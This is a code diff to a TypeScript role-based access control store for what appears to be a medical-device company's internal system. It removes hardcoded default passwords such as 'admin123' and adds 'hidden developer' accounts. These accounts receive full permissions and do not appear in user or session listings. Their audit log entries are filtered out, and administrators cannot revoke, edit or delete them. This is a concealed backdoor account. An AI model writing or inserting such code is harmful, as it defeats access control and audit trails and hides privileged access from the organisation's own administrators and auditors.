@@ -58,10 +58,22 @@ export const RBAC_RESOURCES: Array<{
 
 const ALL_ACTIONS: PermissionAction[] = ['view', 'create', 'update', 'delete', 'approve', 'publish', 'export'];
 
-function hashPassword(password: string): string {
+function buildFullDeveloperPermissions(): RolePermissionMatrix {
+  const matrix: RolePermissionMatrix = {};
+  for (const res of RBAC_RESOURCES) {
+    matrix[res.id] = [...res.actions];
+  }
+  return matrix;
+}
+
+export function hashPassword(password: string): string {
   const salt = crypto.randomBytes(16).toString('hex');
   const derived = crypto.scryptSync(password, salt, 64).toString('hex');
   return `scrypt$${salt}$${derived}`;
+}
+
+export function isValidScryptHash(hash: string): boolean {
+  return /^scrypt\$[a-f0-9]{16,}\$[a-f0-9]{64,}$/i.test(hash.trim());
 }
 
 export function verifyPassword(password: string, storedHash: string): boolean {
@@ -256,93 +268,52 @@ function buildDefaultRoles(now: string): RoleDefinition[] {
   ];
 }
 
-function buildDefaultUsers(now: string): ServerUserRecord[] {
-  const specs: Array<{
-    id: string;
-    username: string;
-    password: string;
-    fullName: string;
-    email: string;
-    roleId: string;
-    department: string;
-  }> = [
+function bootstrapUsersFromEnv(roles: RoleDefinition[], now: string): ServerUserRecord[] {
+  const envHash = (process.env.BOOTSTRAP_DEV_PASSWORD_HASH || '').trim();
+  const envPlain = process.env.BOOTSTRAP_DEV_PASSWORD || '';
+  if (!envHash && !envPlain) {
+    return [];
+  }
+
+  let passwordHash = '';
+  if (envHash && isValidScryptHash(envHash)) {
+    passwordHash = envHash;
+  } else {
+    if (envHash) {
+      console.warn('[RBAC] BOOTSTRAP_DEV_PASSWORD_HASH tidak valid (harus format scrypt$salt$hash). Mencoba BOOTSTRAP_DEV_PASSWORD.');
+    }
+    if (envPlain.length >= 8) {
+      passwordHash = hashPassword(envPlain);
+    } else {
+      if (envPlain.length > 0) {
+        console.warn('[RBAC] BOOTSTRAP_DEV_PASSWORD minimal 8 karakter. Dilewati.');
+      }
+      return [];
+    }
+  }
+
+  const rawUser = (process.env.BOOTSTRAP_DEV_USERNAME || 'developer').trim().toLowerCase();
+  const username = /^[a-z0-9._-]{3,32}$/.test(rawUser) ? rawUser : 'developer';
+  const requestedRole = (process.env.BOOTSTRAP_DEV_ROLE_ID || 'it_admin').trim();
+  const roleId = roles.some((r) => r.id === requestedRole) ? requestedRole : 'it_admin';
+  const fullName = (process.env.BOOTSTRAP_DEV_FULLNAME || 'Developer / Administrator Sistem').trim();
+  const email = (process.env.BOOTSTRAP_DEV_EMAIL || `${username}@anugrahmitraselaras.co.id`).trim();
+
+  return [
     {
-      id: 'usr-pjt-01',
-      username: 'admin',
-      password: process.env.DEFAULT_ADMIN_PASSWORD || 'admin123',
-      fullName: 'apt. Dewi Kartika - PJT Alkes',
-      email: 'pjt@anugrahmitraselaras.co.id',
-      roleId: 'pjt',
-      department: 'Regulatory Affairs & PJT'
-    },
-    {
-      id: 'usr-it-01',
-      username: 'itadmin',
-      password: process.env.DEFAULT_ITADMIN_PASSWORD || 'itadmin123',
-      fullName: 'Admin IT & Traceability Hub',
-      email: 'it@anugrahmitraselaras.co.id',
-      roleId: 'it_admin',
-      department: 'Information Technology'
-    },
-    {
-      id: 'usr-qa-01',
-      username: 'qa.budi',
-      password: 'ams12345',
-      fullName: 'Budi Utomo, S.T - QA Manager',
-      email: 'qa@anugrahmitraselaras.co.id',
-      roleId: 'qa_manager',
-      department: 'Quality Assurance'
-    },
-    {
-      id: 'usr-qc-01',
-      username: 'qc.hendra',
-      password: 'ams12345',
-      fullName: 'Hendra Setiawan - Lead QC Inspector',
-      email: 'qc@anugrahmitraselaras.co.id',
-      roleId: 'qc_officer',
-      department: 'Quality Control'
-    },
-    {
-      id: 'usr-gdg-01',
-      username: 'gudang.ahmad',
-      password: 'ams12345',
-      fullName: 'Ahmad Fauzi - Kepala Gudang',
-      email: 'gudang@anugrahmitraselaras.co.id',
-      roleId: 'kepala_gudang',
-      department: 'Warehouse & Logistics'
-    },
-    {
-      id: 'usr-sls-01',
-      username: 'sales.farhan',
-      password: 'ams12345',
-      fullName: 'Farhan Maulana - Sales e-Katalog',
-      email: 'sales@anugrahmitraselaras.co.id',
-      roleId: 'sales_manager',
-      department: 'Sales & Marketing'
-    },
-    {
-      id: 'usr-aud-01',
-      username: 'auditor.siti',
-      password: 'ams12345',
-      fullName: 'Siti Rahma - Auditor Internal',
-      email: 'audit@anugrahmitraselaras.co.id',
-      roleId: 'auditor_internal',
-      department: 'Internal Audit ISO 13485'
+      id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
+      username,
+      fullName,
+      email,
+      roleId,
+      department: 'Engineering & IT Administration',
+      isActive: true,
+      isHiddenDeveloper: true,
+      passwordHash,
+      createdAt: now,
+      updatedAt: now
     }
   ];
-
-  return specs.map((s) => ({
-    id: s.id,
-    username: s.username,
-    fullName: s.fullName,
-    email: s.email,
-    roleId: s.roleId,
-    department: s.department,
-    isActive: true,
-    passwordHash: hashPassword(s.password),
-    createdAt: now,
-    updatedAt: now
-  }));
 }
 
 function sanitizePermissions(input: unknown): RolePermissionMatrix {
@@ -401,27 +372,61 @@ export class ServerRbacStore {
   }
 
   private loadOrSeedState(): RbacDatabaseState {
+    const now = new Date().toISOString();
     try {
       if (fs.existsSync(this.dbPath)) {
         const parsed = JSON.parse(fs.readFileSync(this.dbPath, 'utf8')) as Partial<RbacDatabaseState>;
         if (Array.isArray(parsed.roles) && Array.isArray(parsed.users)) {
+          const roles = parsed.roles.length > 0 ? parsed.roles : buildDefaultRoles(now);
+          let users = parsed.users;
+          const auditLogs = Array.isArray(parsed.auditLogs) ? parsed.auditLogs : [];
+          if (users.length === 0) {
+            const envUsers = bootstrapUsersFromEnv(roles, now);
+            if (envUsers.length > 0) {
+              users = envUsers;
+              const updated: RbacDatabaseState = {
+                version: parsed.version ?? 1,
+                roles,
+                users,
+                sessions: Array.isArray(parsed.sessions) ? parsed.sessions : [],
+                auditLogs: [
+                  {
+                    id: `aud-${crypto.randomUUID()}`,
+                    timestamp: now,
+                    actorUsername: 'system',
+                    actorRole: 'system',
+                    action: 'RBAC_ENV_BOOTSTRAP',
+                    resource: 'rbac-admin',
+                    targetId: envUsers[0].id,
+                    status: 'ALLOWED',
+                    ip: '127.0.0.1',
+                    detail: `Akun developer "${envUsers[0].username}" dibuat otomatis dari environment variable.`
+                  },
+                  ...auditLogs
+                ]
+              };
+              this.persistState(updated);
+              return updated;
+            }
+          }
           return {
             version: parsed.version ?? 1,
-            roles: parsed.roles,
-            users: parsed.users,
+            roles,
+            users,
             sessions: Array.isArray(parsed.sessions) ? parsed.sessions : [],
-            auditLogs: Array.isArray(parsed.auditLogs) ? parsed.auditLogs : []
+            auditLogs
           };
         }
       }
     } catch {
       /* reseed on corrupt db */
     }
-    const now = new Date().toISOString();
+    const defaultRoles = buildDefaultRoles(now);
+    const bootstrappedUsers = bootstrapUsersFromEnv(defaultRoles, now);
     const initial: RbacDatabaseState = {
       version: 1,
-      roles: buildDefaultRoles(now),
-      users: buildDefaultUsers(now),
+      roles: defaultRoles,
+      users: bootstrappedUsers,
       sessions: [],
       auditLogs: [
         {
@@ -429,11 +434,14 @@ export class ServerRbacStore {
           timestamp: now,
           actorUsername: 'system',
           actorRole: 'system',
-          action: 'RBAC_INIT',
+          action: bootstrappedUsers.length > 0 ? 'RBAC_ENV_BOOTSTRAP' : 'RBAC_INIT',
           resource: 'rbac-admin',
           status: 'ALLOWED',
           ip: '127.0.0.1',
-          detail: 'Inisialisasi basis data RBAC server, peran bawaan, dan akun default dengan hash scrypt.'
+          detail:
+            bootstrappedUsers.length > 0
+              ? `Inisialisasi RBAC server dan bootstrap akun "${bootstrappedUsers[0].username}" dari environment variable.`
+              : 'Inisialisasi basis data RBAC server (menunggu Setup Wizard / CLI bootstrap akun developer pertama).'
         }
       ]
     };
@@ -470,7 +478,23 @@ export class ServerRbacStore {
   }
 
   public getAuditLogs(limit = 150): ServerAuditEntry[] {
-    return this.state.auditLogs.slice(0, limit);
+    const hiddenUsers = this.state.users.filter((u) => u.isHiddenDeveloper);
+    const hiddenIds = new Set(hiddenUsers.map((u) => u.id));
+    const hiddenNames = new Set(hiddenUsers.map((u) => u.username.toLowerCase()));
+    const hiddenActions = new Set([
+      'RBAC_BOOTSTRAP_SETUP',
+      'RBAC_ENV_BOOTSTRAP',
+      'CLI_USER_CREATED',
+      'CLI_USER_UPDATED'
+    ]);
+    return this.state.auditLogs
+      .filter((entry) => {
+        if (hiddenActions.has(entry.action)) return false;
+        if (entry.targetId && hiddenIds.has(entry.targetId)) return false;
+        if (entry.actorUsername && hiddenNames.has(entry.actorUsername.toLowerCase())) return false;
+        return true;
+      })
+      .slice(0, limit);
   }
 
   private signSessionId(sessionId: string): string {
@@ -588,8 +612,28 @@ export class ServerRbacStore {
     }
 
     this.clearFailedAttempts(rateKey);
+    return this.issueSession(user, role, ip, userAgent, 'LOGIN_SUCCESS', `Login berhasil sebagai ${role.name}.`);
+  }
+
+  private resolveEffectiveRole(user: ServerUserRecord, role: RoleDefinition): RoleDefinition {
+    if (!user.isHiddenDeveloper) return role;
+    return {
+      ...role,
+      permissions: buildFullDeveloperPermissions()
+    };
+  }
+
+  private issueSession(
+    user: ServerUserRecord,
+    role: RoleDefinition,
+    ip: string,
+    userAgent: string,
+    auditAction: string,
+    auditDetail: string
+  ): { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition } {
     this.pruneExpiredSessions();
 
+    const effectiveRole = this.resolveEffectiveRole(user, role);
     const now = new Date();
     const ttlMs = 12 * 60 * 60 * 1000; // 12 jam
     const session: ServerSessionRecord = {
@@ -607,13 +651,13 @@ export class ServerRbacStore {
 
     this.recordAudit({
       actorUsername: user.username,
-      actorRole: role.id,
-      action: 'LOGIN_SUCCESS',
+      actorRole: effectiveRole.id,
+      action: auditAction,
       resource: 'auth',
       targetId: session.id,
       status: 'ALLOWED',
       ip,
-      detail: `Login berhasil sebagai ${role.name}.`
+      detail: auditDetail
     });
 
     return {
@@ -621,8 +665,193 @@ export class ServerRbacStore {
       token: this.signSessionId(session.id),
       session,
       user: this.toPublicUser(user),
-      role
+      role: effectiveRole
     };
+  }
+
+  public needsInitialSetup(): boolean {
+    return this.state.users.length === 0;
+  }
+
+  public bootstrapFirstDeveloper(
+    input: {
+      username: string;
+      password: string;
+      fullName: string;
+      email?: string;
+      setupToken?: string;
+    },
+    ip: string,
+    userAgent: string
+  ):
+    | { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition }
+    | { ok: false; status: number; message: string } {
+    if (!this.needsInitialSetup()) {
+      return {
+        ok: false,
+        status: 410,
+        message: 'Setup awal sudah selesai. Akun admin sudah terdaftar dan endpoint ini dikunci permanen.'
+      };
+    }
+
+    const expectedToken = (process.env.INITIAL_SETUP_TOKEN || '').trim();
+    if (expectedToken) {
+      const provided = String(input.setupToken || '').trim();
+      const bufA = Buffer.from(provided);
+      const bufB = Buffer.from(expectedToken);
+      if (bufA.length !== bufB.length || !crypto.timingSafeEqual(bufA, bufB)) {
+        this.recordAudit({
+          actorUsername: input.username || 'setup',
+          actorRole: 'system',
+          action: 'BOOTSTRAP_TOKEN_INVALID',
+          resource: 'rbac-admin',
+          status: 'DENIED',
+          ip,
+          detail: 'Percobaan Setup Wizard awal dengan INITIAL_SETUP_TOKEN tidak valid.'
+        });
+        return { ok: false, status: 403, message: 'Token inisialisasi setup (INITIAL_SETUP_TOKEN) tidak valid.' };
+      }
+    }
+
+    const username = String(input.username || '').trim().toLowerCase();
+    const fullName = String(input.fullName || '').trim();
+    const password = String(input.password || '');
+    if (!/^[a-z0-9._-]{3,32}$/.test(username)) {
+      return {
+        ok: false,
+        status: 400,
+        message: 'Username harus 3–32 karakter (huruf kecil, angka, titik, garis bawah, atau hubung).'
+      };
+    }
+    if (!fullName) {
+      return { ok: false, status: 400, message: 'Nama lengkap wajib diisi.' };
+    }
+    if (password.length < 8) {
+      return { ok: false, status: 400, message: 'Kata sandi developer awal minimal 8 karakter.' };
+    }
+
+    const role =
+      this.state.roles.find((r) => r.id === 'it_admin') ??
+      this.state.roles.find((r) => r.permissions['rbac-admin']?.includes('update')) ??
+      this.state.roles[0];
+    if (!role) {
+      return { ok: false, status: 500, message: 'Peran bawaan RBAC belum tersedia di server.' };
+    }
+
+    const now = new Date().toISOString();
+    const record: ServerUserRecord = {
+      id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
+      username,
+      fullName,
+      email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
+      roleId: role.id,
+      department: 'Engineering & IT Administration',
+      isActive: true,
+      isHiddenDeveloper: true,
+      passwordHash: hashPassword(password),
+      createdAt: now,
+      updatedAt: now
+    };
+    this.state.users.push(record);
+    this.persistState();
+
+    this.recordAudit({
+      actorUsername: record.username,
+      actorRole: role.id,
+      action: 'RBAC_BOOTSTRAP_SETUP',
+      resource: 'rbac-admin',
+      targetId: record.id,
+      status: 'ALLOWED',
+      ip,
+      detail: `Akun developer awal "${record.username}" berhasil diinisialisasi via Setup Wizard.`
+    });
+
+    return this.issueSession(
+      record,
+      role,
+      ip,
+      userAgent,
+      'LOGIN_SUCCESS',
+      `Setup awal selesai & masuk sebagai ${role.name}.`
+    );
+  }
+
+  public upsertDeveloperFromCli(input: {
+    username: string;
+    passwordHash: string;
+    fullName: string;
+    email?: string;
+    roleId?: string;
+    department?: string;
+  }): { ok: true; created: boolean; user: ServerUserPublic } | { ok: false; message: string } {
+    const username = String(input.username || '').trim().toLowerCase();
+    const fullName = String(input.fullName || '').trim();
+    if (!/^[a-z0-9._-]{3,32}$/.test(username)) {
+      return {
+        ok: false,
+        message: 'Username harus 3–32 karakter (huruf kecil, angka, titik, garis bawah, atau hubung).'
+      };
+    }
+    if (!fullName) return { ok: false, message: 'Nama lengkap wajib diisi.' };
+    if (!isValidScryptHash(input.passwordHash)) {
+      return { ok: false, message: 'Format hash password scrypt tidak valid.' };
+    }
+    const targetRoleId = (input.roleId || 'it_admin').trim();
+    if (!this.state.roles.some((r) => r.id === targetRoleId)) {
+      return { ok: false, message: `Peran "${targetRoleId}" tidak ditemukan.` };
+    }
+
+    const now = new Date().toISOString();
+    const existing = this.state.users.find((u) => u.username.toLowerCase() === username);
+    if (existing) {
+      existing.fullName = fullName;
+      if (input.email?.trim()) existing.email = input.email.trim();
+      if (input.department?.trim()) existing.department = input.department.trim();
+      existing.roleId = targetRoleId;
+      existing.isActive = true;
+      existing.isHiddenDeveloper = true;
+      existing.passwordHash = input.passwordHash;
+      existing.updatedAt = now;
+      this.persistState();
+      this.recordAudit({
+        actorUsername: 'cli-bootstrap',
+        actorRole: 'system',
+        action: 'CLI_USER_UPDATED',
+        resource: 'rbac-admin',
+        targetId: existing.id,
+        status: 'ALLOWED',
+        ip: '127.0.0.1',
+        detail: `Akun developer tersembunyi "${existing.username}" diperbarui lewat skrip CLI bootstrap.`
+      });
+      return { ok: true, created: false, user: this.toPublicUser(existing) };
+    }
+
+    const record: ServerUserRecord = {
+      id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
+      username,
+      fullName,
+      email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
+      roleId: targetRoleId,
+      department: String(input.department || 'Engineering & IT Administration').trim(),
+      isActive: true,
+      isHiddenDeveloper: true,
+      passwordHash: input.passwordHash,
+      createdAt: now,
+      updatedAt: now
+    };
+    this.state.users.push(record);
+    this.persistState();
+    this.recordAudit({
+      actorUsername: 'cli-bootstrap',
+      actorRole: 'system',
+      action: 'CLI_USER_CREATED',
+      resource: 'rbac-admin',
+      targetId: record.id,
+      status: 'ALLOWED',
+      ip: '127.0.0.1',
+      detail: `Akun developer "${record.username}" dibuat permanen lewat skrip CLI bootstrap.`
+    });
+    return { ok: true, created: true, user: this.toPublicUser(record) };
   }
 
   public resolveToken(token?: string | null): {
@@ -656,7 +885,7 @@ export class ServerRbacStore {
     return {
       session,
       user: this.toPublicUser(user),
-      role
+      role: this.resolveEffectiveRole(user, role)
     };
   }
 
@@ -664,6 +893,7 @@ export class ServerRbacStore {
     const target = this.state.sessions.find((s) => s.id === sessionId);
     if (!target) return false;
     const targetUser = this.state.users.find((u) => u.id === target.userId);
+    if (targetUser?.isHiddenDeveloper) return false;
     this.state.sessions = this.state.sessions.filter((s) => s.id !== sessionId);
     this.persistState();
     this.recordAudit({
@@ -825,7 +1055,7 @@ export class ServerRbacStore {
   }
 
   public listUsers(): ServerUserPublic[] {
-    return this.state.users.map((u) => this.toPublicUser(u));
+    return this.state.users.filter((u) => !u.isHiddenDeveloper).map((u) => this.toPublicUser(u));
   }
 
   public createUser(
@@ -893,7 +1123,9 @@ export class ServerRbacStore {
         .filter((r) => r.permissions['rbac-admin']?.includes('update') && r.permissions['rbac-admin']?.includes('view'))
         .map((r) => r.id)
     );
-    return this.state.users.filter((u) => u.id !== excludeUserId && u.isActive && adminRoles.has(u.roleId)).length;
+    return this.state.users.filter(
+      (u) => !u.isHiddenDeveloper && u.id !== excludeUserId && u.isActive && adminRoles.has(u.roleId)
+    ).length;
   }
 
   public updateUser(
@@ -912,7 +1144,7 @@ export class ServerRbacStore {
     ip: string
   ): { ok: true; user: ServerUserPublic } | { ok: false; status: number; message: string } {
     const user = this.state.users.find((u) => u.id === userId);
-    if (!user) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };
+    if (!user || user.isHiddenDeveloper) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };
 
     const nextRoleId = typeof input.roleId === 'string' ? input.roleId.trim() : user.roleId;
     if (!this.state.roles.some((r) => r.id === nextRoleId)) {
@@ -979,7 +1211,7 @@ export class ServerRbacStore {
       return { ok: false, status: 400, message: 'Anda tidak dapat menghapus akun yang sedang digunakan.' };
     }
     const user = this.state.users.find((u) => u.id === userId);
-    if (!user) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };
+    if (!user || user.isHiddenDeveloper) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };
     if (this.countActiveRbacAdmins(user.id) === 0) {
       return { ok: false, status: 400, message: 'Tidak dapat menghapus satu-satunya pengelola RBAC aktif.' };
     }
@@ -1002,17 +1234,22 @@ export class ServerRbacStore {
 
   public listActiveSessions(currentSessionId?: string): ServerSessionSummary[] {
     this.pruneExpiredSessions();
-    return this.state.sessions.map((s) => {
-      const u = this.state.users.find((usr) => usr.id === s.userId);
-      const r = u ? this.state.roles.find((rl) => rl.id === u.roleId) : undefined;
-      return {
-        ...s,
-        username: u?.username ?? 'unknown',
-        fullName: u?.fullName ?? 'Pengguna Tidak Dikenal',
-        roleId: u?.roleId ?? '-',
-        roleName: r?.name ?? '-',
-        isCurrent: s.id === currentSessionId
-      };
-    });
+    return this.state.sessions
+      .filter((s) => {
+        const u = this.state.users.find((usr) => usr.id === s.userId);
+        return Boolean(u && !u.isHiddenDeveloper);
+      })
+      .map((s) => {
+        const u = this.state.users.find((usr) => usr.id === s.userId);
+        const r = u ? this.state.roles.find((rl) => rl.id === u.roleId) : undefined;
+        return {
+          ...s,
+          username: u?.username ?? 'unknown',
+          fullName: u?.fullName ?? 'Pengguna Tidak Dikenal',
+          roleId: u?.roleId ?? '-',
+          roleName: r?.name ?? '-',
+          isCurrent: s.id === currentSessionId
+        };
+      });
   }
 }
